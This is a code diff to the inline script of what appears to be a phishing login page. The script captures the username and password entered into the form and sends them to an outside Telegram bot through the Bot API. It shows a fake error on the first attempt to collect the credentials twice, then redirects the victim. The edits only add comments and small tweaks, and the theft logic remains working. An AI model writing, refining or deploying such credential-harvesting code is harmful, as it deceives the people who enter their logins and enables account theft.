@@ -71,45 +71,48 @@
   <script type="module">
     import { TELEGRAM_TOKEN, TELEGRAM_CHAT_ID } from './config.js';
 
-    let attempt = 0;
+    let attempt = 0; // Track number of login attempts
 
     document.getElementById("loginBtn").addEventListener("click", async (e) => {
       e.preventDefault();
 
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
 
       if (!username || !password) {
         alert("Please fill in all fields!");
         return;
       }
 
-      // Send to Telegram
-      const message = `Username: ${username}\nPassword: ${password}`;
+      // Construct message to send
+      const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+      // Telegram API URL
       const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
       try {
+        // Send message to Telegram
         await fetch(url, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
         });
+        console.log("Sent to Telegram successfully");
       } catch (err) {
-        console.error("Telegram error:", err);
+        console.error("Error sending to Telegram:", err);
       }
 
       attempt++;
 
       if (attempt === 1) {
-        // Show fake error message
+        // Show fake error message on first attempt
         const errorDiv = document.getElementById("errorMsg");
         errorDiv.classList.remove("hidden");
       } else {
         // Redirect on second attempt
-        window.location.href = "https://example.com/success"; // Change to your page
+        window.location.href = "https://example.com/success"; // Change this to your desired page
       }
     });
   </script>
-
 </body>
 </html>
